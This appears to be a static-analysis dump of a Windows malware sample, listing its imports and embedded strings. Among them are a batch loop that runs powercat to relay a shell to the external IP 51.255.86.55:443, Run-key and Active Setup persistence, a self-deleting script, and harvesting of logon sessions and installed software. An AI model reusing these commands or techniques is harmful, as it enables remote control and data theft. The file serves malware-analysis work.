reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4036a7	0x448410	import	0x40361c	KERNEL32.dll.FileTimeToSystemTime
0x4036cc	0x448410	import	0x40361c	KERNEL32.dll.FileTimeToSystemTime
0x403837	0x40371a	string	0x40371a	UWVS
0x403890	0x40252b	string	0x40385a	UWVS
0x4038a0	0x4484d4	import	0x40385a	KERNEL32.dll.Sleep
0x4038bc	0x448440	import	0x40385a	KERNEL32.dll.GetFileAttributesExW
0x403928	0x40252b	string	0x4038f2	UWVS
0x40393e	0x4483e0	import	0x4038f2	KERNEL32.dll.CreateDirectoryW
0x403a1d	0x40252b	string	0x4039e2	UWVS
0x403a6b	0x41f1ec	string	0x4039e2	hyd7u5jdi8
0x403a97	0x4088ee	string	0x4039e2	UWVS
0x403a9c	0x41f24e	string	0x4039e2	shell32.dll
0x403aa3	0x44848c	import	0x4039e2	KERNEL32.dll.LoadLibraryA
0x403ab1	0x448464	import	0x4039e2	KERNEL32.dll.GetProcAddress
0x403b71	0x44845c	import	0x403b43	KERNEL32.dll.GetModuleFileNameW
0x403b97	0x4023cb	string	0x403b43	UWVS
0x403c7e	0x44842c	import	0x403c2f	KERNEL32.dll.GetCommandLineW
0x403cc8	0x4023cb	string	0x403c2f	UWVS
0x403dc5	0x40252b	string	0x403d80	UWVS
0x404334	0x41f264	string	0x4042a1	%d\a%d\ahttp://%s%s\a%s
0x404375	0x401ebb	string	0x4042a1	UWVS
0x404432	0x41f279	string	0x40439a	GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.8\r\nConnection: close\r\n\r\n
0x4044f2	0x41f371	string	0x40439a	200 OK
0x4044f9	0x409d24	string	0x40439a	UWVS
0x404506	0x41f378	string	0x40439a	\r\n\r\n
0x40450d	0x409d24	string	0x40439a	UWVS
0x4045f4	0x403288	string	0x40439a	UWV1
0x404733	0x4077f4	string	0x4046ae	UWVS
0x4047eb	0x40a3c6	string	0x4046ae	UWVS
0x404815	0x40a3c6	string	0x4046ae	UWVS
0x404839	0x40a3c6	string	0x4046ae	UWVS
0x404841	0x409df3	string	0x4046ae	UWVS
0x404870	0x40a3c6	string	0x4046ae	UWVS
0x404888	0x41f380	string	0x4046ae	%TEMP%
0x4048ca	0x41f387	string	0x4046ae	hyd7u5jdi8
0x4048f9	0x4088ee	string	0x4046ae	UWVS
0x4049d9	0x4485ac	import	0x4046ae	WS2_32.dll.WSACleanup
0x4049e6	0x448408	import	0x4046ae	KERNEL32.dll.ExitProcess
0x404a26	0x401ebb	string	0x4046ae	UWVS
0x404aa5	0x40a3c6	string	0x4046ae	UWVS
0x404acf	0x40a3c6	string	0x4046ae	UWVS
0x404af3	0x40a3c6	string	0x4046ae	UWVS
0x404afb	0x409df3	string	0x4046ae	UWVS
0x404b25	0x40a3c6	string	0x4046ae	UWVS
0x404b36	0x41f380	string	0x4046ae	%TEMP%
0x404b5c	0x40a5a6	string	0x4046ae	UWVS
0x404b77	0x41f392	string	0x4046ae	%s\%s.%s
0x404b9d	0x41f39b	string	0x4046ae	%s\%s
0x404bd4	0x40a3c6	string	0x4046ae	UWVS
0x404bdc	0x409df3	string	0x4046ae	UWVS
0x404ca1	0x407dcf	string	0x4046ae	UWVS
0x404cbd	0x407dcf	string	0x4046ae	UWVS
0x404cdf	0x407dcf	string	0x4046ae	UWVS
0x404ddf	0x40b7fd	string	0x4046ae	UWVS
0x404e1d	0x409df3	string	0x4046ae	UWVS
0x404e32	0x409df3	string	0x4046ae	UWVS
0x404efe	0x41f3a1	string	0x4046ae	%s\*
0x404f34	0x402af6	string	0x4046ae	UWVS
0x404f9a	0x41f3a6	string	0x4046ae	%s\a%d
0x405004	0x40a3c6	string	0x4046ae	UWVS
0x40502e	0x40a3c6	string	0x4046ae	UWVS
0x40507e	0x40a3c6	string	0x4046ae	UWVS
0x4050a2	0x40a3c6	string	0x4046ae	UWVS
0x4050c6	0x40a3c6	string	0x4046ae	UWVS
0x4050ce	0x409df3	string	0x4046ae	UWVS
0x4050de	0x403288	string	0x4046ae	UWV1
0x405115	0x40a3c6	string	0x4046ae	UWVS
0x405139	0x40a3c6	string	0x4046ae	UWVS
0x4051cc	0x4039e2	string	0x4046ae	UWVS
0x40522b	0x40a3c6	string	0x4046ae	UWVS
0x405255	0x40a3c6	string	0x4046ae	UWVS
0x4052fc	0x407dcf	string	0x4046ae	UWVS
0x40531e	0x407dcf	string	0x4046ae	UWVS
0x405357	0x40107d	string	0x4046ae	UWVS
0x405391	0x4012b8	string	0x4046ae	UWVS
0x4054ae	0x40a3c6	string	0x4046ae	UWVS
0x4054d8	0x40a3c6	string	0x4046ae	UWVS
0x4054fc	0x40a3c6	string	0x4046ae	UWVS
0x40553a	0x40a3c6	string	0x4046ae	UWVS
0x405542	0x409df3	string	0x4046ae	UWVS
0x40556c	0x40a3c6	string	0x4046ae	UWVS
0x405574	0x409df3	string	0x4046ae	UWVS
0x4055e8	0x407dcf	string	0x4046ae	UWVS
0x405607	0x407dcf	string	0x4046ae	UWVS
0x405626	0x407dcf	string	0x4046ae	UWVS
0x405645	0x407dcf	string	0x4046ae	UWVS
0x405667	0x407dcf	string	0x4046ae	UWVS
0x4056e4	0x407dcf	string	0x4046ae	UWVS
0x405700	0x407dcf	string	0x4046ae	UWVS
0x405776	0x407dcf	string	0x4046ae	UWVS
0x405792	0x407dcf	string	0x4046ae	UWVS
0x4057b9	0x407dcf	string	0x4046ae	UWVS
0x4057d9	0x407dcf	string	0x4046ae	UWVS
0x4057f9	0x407dcf	string	0x4046ae	UWVS
0x405820	0x407dcf	string	0x4046ae	UWVS
0x4059a1	0x415040	string	0x405993	function powercat\n{\n param(\n [alias("Client")][string]$c="",\n [alias("Listen")][switch]$l=$False,\n [alias("Port")][Parameter(Position=-1)][string]$p="",\n [alias("Execute")][string]$e="",\n [alias("ExecutePowershell")][switch]$ep=$False,\n [alias("Relay")][string]$r="",\n [alias("UDP")][switch]$u=$False,\n [alias("dnscat2")][string]$dns="",\n [alias("DNSFailureThreshold")][int32]$dnsft=10,\n [alias("Timeout")][int32]$t=60,\n [Parameter(ValueFromPipeline=$True)][alias("Input")]$i=$null,\n [ValidateSet('Host', 'Bytes', 'String')][alias("OutputType")][string]$o="Host",\n [alias("OutputFile")][string]$of="",\n [alias("Disconnect")][switch]$d=$False,\n [alias("Repeater")][switch]$rep=$False,\n [alias("GeneratePayload")][switch]$g=$False,\n [alias("GenerateEncoded")][switch]$ge=$False,\n [alias("Help")][switch]$h=$False\n )\n\n ############### HELP ###############\n $Help = "\npowercat - Netcat, The Powershell Version\nGithub Repository: https://github.com/besimorhino/powercat\n\nThis script attempts to implement the features of netcat in a powershell\nscript. It also contains extra features such as built-in relays, execute\npowershell, and a dnscat2 client.\n\nUsage: powercat [-c or -l] [-p port] [options]\n\n -c <ip> Client Mode. Provide the IP of the system you wish to connect to.\n If you are using -dns, specify the DNS Server to send queries to.\n\n -l Listen Mode. Start a listener on the port specified by -p.\n\n -p <port> Port. The port to connect to, or the port to listen on.\n\n -e <proc> Execute. Specify the name of the process to start.\n\n -ep Execute Powershell. Start a pseudo powershell session. You can\n declare variables and execute commands, but if you try to enter\n another shell (nslookup, netsh, cmd, etc.) the shell will hang.\n\n -r <str> Relay. Used for relaying network traffic between two nodes.\n Client Re
0x4059ba	0x41e0c0	string	0x405993	@echo off\r\n:loop\r\ncmd.exe /c powershell; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force;. "%s"; powercat -l -p 4000 -r tcp:51.255.86.55:443; \r\ngoto :loop
0x4059cd	0x41f518	string	0x405993	%TEMP%\powercat.ps1
0x405a42	0x41f52c	string	0x405993	%TEMP%\loopc.cmd
0x405aab	0x41f53d	string	0x405993	/c "%s"
0x405acf	0x41f545	string	0x405993	C:\Windows\system32\cmd.exe
0x405ad6	0x403288	string	0x405993	UWV1
0x405aef	0x41f561	string	0x405ae6	psapi.dll
0x405afb	0x41f56b	string	0x405ae6	GetModuleFileNameExA
0x405b0f	0x41f580	string	0x405ae6	kernel32.dll
0x405b1b	0x41f56b	string	0x405ae6	GetModuleFileNameExA
0x405b6e	0x4483dc	import	0x405ae6	KERNEL32.dll.CloseHandle
0x405b79	0x41f58d	string	0x405ae6	ns.exe
0x405b90	0x4483dc	import	0x405ae6	KERNEL32.dll.CloseHandle
0x405bc2	0x4484d4	import	0x405ae6	KERNEL32.dll.Sleep
0x405bc9	0x4089e0	string	0x405ae6	UWVS
0x405bd3	0x40125c	string	0x405ae6	1҉й\b blocks=Basic Latin,Cyrillic
0x405bf3	0x41f594	string	0x405ae6	51.255.86.55:443;
0x405c1b	0x4485b8	import	0x405ae6	WS2_32.dll.WSAStartup
0x405c23	0x406d78	string	0x405ae6	UWVS
0x405de2	0x409df3	string	0x405dd8	UWVS
0x405e00	0x409df3	string	0x405df6	UWVS
0x405e1d	0x41f5ee	string	0x405e0f	@echo off\r\nping 192.0.2.2 -n 1 -w %d >nul 2>&1\r\ndel /s "%s" >nul 2>&1\r\ncall :%s&exit /b\r\n:%s\r\nstart /b "" cmd /c del "%%~f0"&exit /b\r\n
0x405ebd	0x41f5c8	string	0x405e0f	%TEMP%
0x405eed	0x41f5cf	string	0x405e0f	%s\%s.cmd
0x405f92	0x41f5d9	string	0x405e0f	%ComSpec%
0x405fb5	0x41f5e3	string	0x405e0f	%s /c "%s"
0x405fe0	0x403288	string	0x405e0f	UWV1
0x405ff8	0x41f675	string	0x405ff4	kernel32.dll
0x405fff	0x44848c	import	0x405ff4	KERNEL32.dll.LoadLibraryA
0x406006	0x41f682	string	0x405ff4	SetThreadExecutionState
0x406011	0x448464	import	0x405ff4	KERNEL32.dll.GetProcAddress
0x406067	0x403c2f	string	0x406047	UWVS
0x4060a2	0x403c2f	string	0x406047	UWVS
0x4060d6	0x4039e2	string	0x406047	UWVS
0x406130	0x448438	import	0x406047	KERNEL32.dll.GetCurrentProcessId
0x406163	0x406047	string	0x406047	VS1ہ blocks=Basic Latin,Arabic
0x406171	0x448578	import	0x406047	USER32.dll.PostQuitMessage
0x406185	0x44851c	import	0x406047	USER32.dll.BeginPaint
0x40619a	0x4483d0	import	0x406047	GDI32.dll.SetTextColor
0x4061c5	0x4483d4	import	0x406047	GDI32.dll.TextOutA
0x4061d5	0x44852c	import	0x406047	USER32.dll.EndPaint
0x4061fe	0x448524	import	0x406047	USER32.dll.DefWindowProcA
0x406218	0x448460	import	0x406210	KERNEL32.dll.GetModuleHandleA
0x406250	0x448568	import	0x406210	USER32.dll.LoadIconA
0x406280	0x448564	import	0x406210	USER32.dll.LoadCursorA
0x406293	0x4483c8	import	0x406210	GDI32.dll.GetStockObject
0x4062a6	0x41f69d	string	0x406210	TFrmMain
0x4062cc	0x44857c	import	0x406210	USER32.dll.RegisterClassExA
0x4062f1	0x448554	import	0x406210	USER32.dll.GetSystemMetrics
0x40633b	0x41f6a6	string	0x406210	Microsoft Windows
0x406343	0x41f69d	string	0x406210	TFrmMain
0x406352	0x448520	import	0x406210	USER32.dll.CreateWindowExA
0x406368	0x44858c	import	0x406210	USER32.dll.SetForegroundWindow
0x40638a	0x448584	import	0x406210	USER32.dll.SendMessageA
0x406390	0x448574	import	0x406210	USER32.dll.PeekMessageA
0x4063cf	0x44859c	import	0x406210	USER32.dll.TranslateMessage
0x4063d9	0x448528	import	0x406210	USER32.dll.DispatchMessageA
0x4063e7	0x4484d4	import	0x406210	KERNEL32.dll.Sleep
0x40642d	0x4483ec	import	0x4063ff	KERNEL32.dll.CreateMutexA
0x40643f	0x44844c	import	0x4063ff	KERNEL32.dll.GetLastError
0x406470	0x4484b4	import	0x406451	KERNEL32.dll.ReleaseMutex
0x40647f	0x4483dc	import	0x406451	KERNEL32.dll.CloseHandle
0x4064a9	0x41f6b8	string	0x40648a	SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
0x4064ff	0x40252b	string	0x40648a	UWVS
0x40650c	0x41f6e8	string	0x40648a	SOFTWARE\Microsoft\Active Setup\Installed Components
0x406534	0x403bcc	string	0x40648a	UWVS
0x406548	0x41f752	string	0x40648a	default.conf
0x406550	0x41f75f	string	0x40648a	%s%s
0x4065f5	0x4088ee	string	0x4065af	UWVS
0x40661d	0x4088ee	string	0x4065af	UWVS
0x406645	0x4088ee	string	0x4065af	UWVS
0x40666d	0x4088ee	string	0x4065af	UWVS
0x406695	0x4088ee	string	0x4065af	UWVS
0x4066bd	0x4088ee	string	0x4065af	UWVS
0x4066e5	0x4088ee	string	0x4065af	UWVS
0x40670d	0x4088ee	string	0x4065af	UWVS
0x406735	0x4088ee	string	0x4065af	UWVS
0x40675d	0x4088ee	string	0x4065af	UWVS
0x406785	0x4088ee	string	0x4065af	UWVS
0x4067ad	0x4088ee	string	0x4065af	UWVS
0x4067d5	0x4088ee	string	0x4065af	UWVS
0x40684d	0x40a3c6	string	0x4067e2	UWVS
0x406876	0x40a3c6	string	0x4067e2	UWVS
0x406890	0x409df3	string	0x4067e2	UWVS
0x40692b	0x40a3c6	string	0x4067e2	UWVS
0x40694f	0x40a3c6	string	0x4067e2	UWVS
0x40697a	0x40a3c6	string	0x4067e2	UWVS
0x406982	0x409df3	string	0x4067e2	UWVS
0x40699d	0x409df3	string	0x4067e2	UWVS
0x4069f4	0x403bcc	string	0x4069d8	UWVS
0x406a12	0x41f752	string	0x4069d8	default.conf
0x406a1a	0x41f75f	string	0x4069d8	%s%s
0x406a8f	0x4088ee	string	0x4069d8	UWVS
0x406af2	0x40252b	string	0x4069d8	UWVS
0x406b06	0x4484c8	import	0x4069d8	KERNEL32.dll.SetFileAttributesW
0x406b53	0x403bcc	string	0x406b1b	UWVS
0x406b74	0x41f752	string	0x406b1b	default.conf
0x406b7c	0x41f75f	string	0x406b1b	%s%s
0x406c17	0x41f764	string	0x406b1b	hyd7u5jdi8
0x406c43	0x4088ee	string	0x406b1b	UWVS
0x406c53	0x409d24	string	0x406b1b	UWVS
0x406ce7	0x4088ee	string	0x406b1b	UWVS
0x406d64	0x4069d8	string	0x406b1b	UWVS
0x406dfc	0x40371a	string	0x406d78	UWVS
0x406e53	0x4483e4	import	0x406d78	KERNEL32.dll.CreateFileA
0x406e6a	0x409e43	string	0x406d78	UWVS
0x406e8c	0x4484d0	import	0x406d78	KERNEL32.dll.SetFileTime
0x406e98	0x4483dc	import	0x406d78	KERNEL32.dll.CloseHandle
0x406eba	0x41f76f	string	0x406d78	-m "%s"
0x406f16	0x448574	import	0x406d78	USER32.dll.PeekMessageA
0x406f22	0x44859c	import	0x406d78	USER32.dll.TranslateMessage
0x406f2c	0x448528	import	0x406d78	USER32.dll.DispatchMessageA
0x406f32	0x4484d4	import	0x406d78	KERNEL32.dll.Sleep
0x406f5f	0x41f777	string	0x406d78	/c copy "%s+" "%s"
0x406f83	0x41f78a	string	0x406d78	C:\Windows\system32\cmd.exe
0x406f8a	0x403288	string	0x406d78	UWV1
0x406f9e	0x403288	string	0x406d78	UWV1
0x406fb5	0x448408	import	0x406d78	KERNEL32.dll.ExitProcess
0x406ff5	0x40252b	string	0x406d78	UWVS
0x407018	0x41f6b8	string	0x406d78	SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
0x40706a	0x40252b	string	0x406d78	UWVS
0x407082	0x41f7a6	string	0x406d78	SOFTWARE\Microsoft\Active Setup\Installed Components\%s\
0x4070a5	0x41f7e0	string	0x406d78	"%s"
0x4070cf	0x41f7ea	string	0x406d78	StubPath
0x40715e	0x406b1b	string	0x406d78	UWVS
0x4071ba	0x4069d8	string	0x407173	UWVS
0x407206	0x4069d8	string	0x4071bf	UWVS
0x407233	0x41f804	string	0x40720c	SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
0x4072d7	0x41f804	string	0x40720c	SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
0x4072df	0x41f86c	string	0x40720c	%s\%s
0x40737c	0x41f878	string	0x40720c	DisplayName
0x4073b7	0x41f890	string	0x40720c	UninstallString
0x407410	0x41f8b0	string	0x40720c	DisplayVersion
0x407469	0x41f8ce	string	0x40720c	Publisher
0x4074c2	0x41f8e2	string	0x40720c	QuietUninstallString
0x407533	0x41f90c	string	0x40720c	%s\a%s\a%s\a%s\a%s\a
0x40762b	0x401ebb	string	0x407599	UWVS
0x4076b3	0x40d166	string	0x407640	WVSS
0x407763	0x407640	string	0x407704	UWVS1ہ blocks=Basic Latin,Arabic
0x4077b7	0x40e45e	string	0x407704	UWVS
0x4077e6	0x401ebb	string	0x407704	UWVS
0x407816	0x407640	string	0x4077f4	UWVS1ہ blocks=Basic Latin,Arabic
0x40786b	0x40e45e	string	0x4077f4	UWVS
0x4078b9	0x401ebb	string	0x4077f4	UWVS
0x407970	0x401ebb	string	0x407924	UWVS
0x40797a	0x41f92c	string	0x407924	Secur32.dll
0x407991	0x41f938	string	0x407924	LsaGetLogonSessionData
0x4079a5	0x41f94f	string	0x407924	LsaFreeReturnBuffer
0x4079b7	0x41f963	string	0x407924	LsaEnumerateLogonSessions
0x407ad8	0x41f97e	string	0x407924	%lu\a%s\a%s\a%s\a%.2d/%.2d/%d %.2d:%.2d:%.2d\a%s\a
0x407b7c	0x401ebb	string	0x407924	UWVS
0x407f12	0x401ebb	string	0x407e98	UWVS
0x407f32	0x41f9d8	string	0x407e98	psapi.dll
0x407f3e	0x41f9e2	string	0x407e98	GetModuleFileNameExW
0x407f54	0x41f9f7	string	0x407e98	kernel32.dll
0x407f60	0x41f9e2	string	0x407e98	GetModuleFileNameExW
0x408046	0x41fa04	string	0x407e98	%.2d/%.2d/%d %.2d:%.2d:%.2d
0x4080f1	0x41fa3c	string	0x407e98	%s\a%d\a%s\a%s\a
0x4081b7	0x401ebb	string	0x407e98	UWVS
0x4081da	0x409df3	string	0x4081cc	UWVS
0x408297	0x409d24	string	0x408234	UWVS
0x4082c8	0x409d24	string	0x408234	UWVS
0x4082fe	0x409d24	string	0x408234	UWVS
0x408375	0x41fa5c	string	0x408369	winhttp.dll
0x408381	0x41fa68	string	0x408369	WinHttpOpen
0x408391	0x41fa5c	string	0x408369	winhttp.dll
0x40839f	0x41fa74	string	0x408369	WinHttpGetProxyForUrl
0x4083af	0x41fa5c	string	0x408369	winhttp.dll
0x4083bd	0x41fa8a	string	0x408369	WinHttpCloseHandle
0x40840b	0x41fa9e	string	0x408369	InternetProxy
0x40848d	0x41faba	string	0x408369	http://www.yandex.com
0x4084da	0x4023cb	string	0x408369	UWVS
0x408500	0x409da0	string	0x408369	WVSQ
0x408523	0x41fae6	string	0x408369	http=
0x40852e	0x408234	string	0x408369	UWVS
0x40856f	0x409df3	string	0x408369	UWVS
0x4085a3	0x41faec	string	0x408369	socks=
0x4085ae	0x408234	string	0x408369	UWVS
0x4085ed	0x409df3	string	0x408369	UWVS
0x408635	0x409df3	string	0x408369	UWVS
0x40865b	0x41fa5c	string	0x408369	winhttp.dll
0x408667	0x41faf3	string	0x408369	WinHttpGetIEProxyConfigForCurrentUser
0x4086c8	0x4023cb	string	0x408369	UWVS
0x4086f4	0x409da0	string	0x408369	WVSQ
0x408711	0x41fae6	string	0x408369	http=
0x40871c	0x408234	string	0x408369	UWVS
0x408763	0x409df3	string	0x408369	UWVS
0x408797	0x41faec	string	0x408369	socks=
0x4087a2	0x408234	string	0x408369	UWVS
0x4087e1	0x409df3	string	0x408369	UWVS
0x408829	0x409df3	string	0x408369	UWVS
0x40898a	0x408952	string	0x4088ee	9\$\f}4@
0x408ad8	0x408b34	string	0x408acc	[^ÐU blocks=Basic Latin,Latin-1 Supplement
0x408bf0	0x408b71	string	0x408b38	;]\bǅ blocks=Basic Latin,Latin Extended-B
0x408c69	0x408b71	string	0x408b38	;]\bǅ blocks=Basic Latin,Latin Extended-B
0x408d7f	0x408b71	string	0x408b38	;]\bǅ blocks=Basic Latin,Latin Extended-B
0x408e66	0x401cb2	string	0x408dc2	UWVS
0x4091a2	0x40f322	string	0x408edc	UWVS
0x4091fe	0x401ebb	string	0x408edc	UWVS
0x4098a5	0x41fb1c	string	0x4097f3	ws2_32.dll
0x4098b1	0x41fb27	string	0x4097f3	connect
0x409bf4	0x40252b	string	0x409b0b	UWVS
0x409c95	0x4023cb	string	0x409c40	UWVS
0x409d50	0x409d66	string	0x409d24	[^_]ËT$ blocks=Basic Latin,Latin-1 Supplement
0x409e26	0x409e3e	string	0x409df3	[^_]
0x40a087	0x40a08b	string	0x40a06b	[ËD$ blocks=Basic Latin,Latin-1 Supplement
0x40a3a7	0x40a38d	string	0x40a38b	;T$\ft
0x40a45a	0x40a464	string	0x40a3c6	;L$8t
0x40a653	0x40a642	string	0x40a63c	;D$\b}\r
0x40a6cc	0x40252b	string	0x40a656	UWVS
0x40a708	0x4023cb	string	0x40a656	UWVS
0x40a7a8	0x4023cb	string	0x40a720	UWVS
0x40a7cb	0x41fb30	string	0x40a7b9	%USERNAME%
0x40a82a	0x4023cb	string	0x40a7b9	UWVS
0x40a87a	0x41fb3b	string	0x40a837	kernel32.dll
0x40a886	0x41fb48	string	0x40a837	GetNativeSystemInfo
0x40aa83	0x41fb5c	string	0x40a837	ProductType
0x40aa8b	0x41fb68	string	0x40a837	SYSTEM\CurrentControlSet\Control\ProductOptions
